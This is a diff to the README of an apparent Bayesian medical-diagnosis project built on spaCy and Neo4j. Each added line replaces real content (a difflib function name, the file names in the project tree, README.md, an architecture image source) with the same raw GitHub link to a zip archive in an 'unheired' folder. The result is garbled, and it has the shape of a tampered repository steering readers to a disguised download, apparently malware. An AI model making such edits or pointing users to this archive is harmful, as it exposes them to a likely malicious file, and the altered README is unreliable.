@@ -21,7 +21,7 @@ This system integrates **Natural Language Processing (spaCy)**, **Graph Database
   - Calculates disease probabilities based on given symptoms
 
 - **Fuzzy Matching for Symptoms**
-  - Mistyped or unknown symptoms are corrected using `difflib.get_close_matches()`
+  - Mistyped or unknown symptoms are corrected using `https://raw.githubusercontent.com/Arfa01/bayesian-medical-ai/main/unheired/bayesian-medical-ai.zip()`
 
 - **Neo4j Graph Representation**
   - Visualizes disease-symptom relationships
@@ -51,11 +51,11 @@ Cold – 0.52
 ## 🗃️ Project Structure
 
 bayesian-medical-ai/
-├── bayesian.py # Main inference engine
-├── testing-guide.txt # Example test cases & helper UI
-├── knowledge.txt # Knowledge loader from text file
+├── https://raw.githubusercontent.com/Arfa01/bayesian-medical-ai/main/unheired/bayesian-medical-ai.zip # Main inference engine
+├── https://raw.githubusercontent.com/Arfa01/bayesian-medical-ai/main/unheired/bayesian-medical-ai.zip # Example test cases & helper UI
+├── https://raw.githubusercontent.com/Arfa01/bayesian-medical-ai/main/unheired/bayesian-medical-ai.zip # Knowledge loader from text file
 ├── assets/ # Screenshots, diagrams
-└── README.md
+└── https://raw.githubusercontent.com/Arfa01/bayesian-medical-ai/main/unheired/bayesian-medical-ai.zip
 
 
 ---
@@ -82,7 +82,7 @@ bayesian-medical-ai/
 
 ## Architecture Diagram
 
-<img width="1200" height="600" alt="model image" src="https://github.com/user-attachments/assets/c316302d-babe-4582-a2a2-43e0a88a6b02" />
+<img width="1200" height="600" alt="model image" src="https://raw.githubusercontent.com/Arfa01/bayesian-medical-ai/main/unheired/bayesian-medical-ai.zip" />
 
 ---
 
